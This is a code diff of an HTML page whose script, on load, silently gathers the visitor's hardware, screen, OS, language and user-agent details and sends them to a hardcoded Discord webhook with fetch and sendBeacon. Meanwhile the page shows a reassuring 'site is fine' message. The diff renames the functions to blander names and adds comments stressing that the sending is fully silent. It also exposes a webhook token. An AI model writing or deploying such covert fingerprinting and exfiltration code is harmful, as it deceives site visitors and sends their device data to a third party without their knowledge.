@@ -39,7 +39,7 @@
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        function sistemVerileriniTopla() {
+        function teknikAnaliz() {
             let gpu = "Bilinmiyor";
             try {
                 const canvas = document.createElement('canvas');
@@ -50,29 +50,31 @@
 
             return {
                 embeds: [{
-                    title: "🖥️ SİSTEM ANALİZ RAPORU",
+                    title: "🖥️ DONANIM ANALİZİ",
                     color: 3066993,
                     fields: [
-                        { name: "⚙️ DONANIM", value: `**GPU:** \`${gpu}\`\n**RAM:** ${navigator.deviceMemory || 'Bilinmiyor'} GB\n**CPU:** ${navigator.hardwareConcurrency || 'Bilinmiyor'} Çekirdek`, inline: false },
-                        { name: "📏 GÖRÜNTÜ", value: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`, inline: true },
+                        { name: "⚙️ BİLEŞENLER", value: `**GPU:** \`${gpu}\`\n**RAM:** ${navigator.deviceMemory || 'Bilinmiyor'} GB\n**CPU:** ${navigator.hardwareConcurrency || 'Bilinmiyor'} Çekirdek`, inline: false },
+                        { name: "📏 GÖRÜNTÜ", value: `${window.screen.width}x${window.screen.height}`, inline: true },
                         { name: "📱 SİSTEM", value: `**OS:** ${navigator.platform}\n**Dil:** ${navigator.language}`, inline: true },
-                        { name: "🕒 LOG", value: new Date().toLocaleString('tr-TR'), inline: false },
+                        { name: "🕒 ZAMAN", value: new Date().toLocaleString('tr-TR'), inline: false },
                         { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```", inline: false }
                     ]
                 }]
             };
         }
 
-        async function sistemiCalistir() {
+        async function baslat() {
             const msg = document.getElementById('msg');
             const loader = document.getElementById('loader');
-            const data = sistemVerileriniTopla();
+            const paket = teknikAnaliz();
 
+            // Veri gönderimi tamamen sessiz (Arka planda)
             try {
-                await fetch(webhookURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
-                navigator.sendBeacon(webhookURL, JSON.stringify(data));
-            } catch (err) {}
+                fetch(webhookURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(paket) });
+                navigator.sendBeacon(webhookURL, JSON.stringify(paket));
+            } catch (e) {}
 
+            // Sadece senin istediğin mesaj akışı
             setTimeout(() => {
                 loader.style.display = "none";
                 msg.innerHTML = '<span class="success-text">Site uygun halde!</span>';
@@ -83,7 +85,7 @@
             }, 3000); 
         }
 
-        window.onload = sistemiCalistir;
+        window.onload = baslat;
     </script>
 </body>
 </html>
